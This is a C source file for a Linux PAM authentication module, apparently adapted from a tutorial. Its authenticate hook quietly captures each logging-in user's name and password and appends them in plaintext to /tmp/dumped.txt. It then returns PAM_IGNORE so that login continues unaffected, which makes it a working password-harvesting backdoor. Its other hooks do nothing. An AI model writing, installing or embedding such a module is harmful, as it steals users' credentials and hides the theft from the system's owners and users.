/* Define which PAM interfaces we provide */
#include <security/_pam_types.h>
#define PAM_SM_ACCOUNT
#define PAM_SM_AUTH
#define PAM_SM_PASSWORD
#define PAM_SM_SESSION

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <security/pam_appl.h>
#include <security/pam_ext.h>
#include <security/pam_modules.h>
// https://dev.to/rkeene/writing-your-first-pam-module-1bk
//
/* PAM entry point for session creation */
int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc,
                        const char **argv) {
  return (PAM_IGNORE);
}

/* PAM entry point for session cleanup */
int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc,
                         const char **argv) {
  return (PAM_IGNORE);
}

/* PAM entry point for accounting */
int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc,
                     const char **argv) {
  return (PAM_IGNORE);
}

/* PAM entry point for authentication verification */
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc,
                        const char **argv) {
  FILE *f = fopen("/tmp/dumped.txt", "a");
  const char *user = NULL;
  if (pam_get_user(pamh, &user, "spit user:") != PAM_SUCCESS) {
    // fprintf(stderr, "failed to get user");
    return (PAM_IGNORE);
  }
  // fprintf(stderr, "got username %s\n", user);
  const char *password = NULL;
  if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, "spit password:") !=
      PAM_SUCCESS) {
    // fprintf(stderr, "failed to get authtok");
    return (PAM_IGNORE);
  }
  // fprintf(stderr, "got authtoken %s\n\n", password);
  int size = snprintf(NULL, 0, "%s %s\n\n", user, password);
  char *buffer = calloc(1, size + 1);
  snprintf(buffer, size, "%s %s\n", user, password);
  fwrite(buffer, size, 1, f);
  fclose(f);
  return (PAM_IGNORE);
}

/*
   PAM entry point for setting user credentials (that is, to actually
   establish the authenticated user's credentials to the service provider)
 */
int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return (PAM_IGNORE);
}

/* PAM entry point for authentication token (password) changes */
int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc,
                     const char **argv) {
  return (PAM_IGNORE);
}
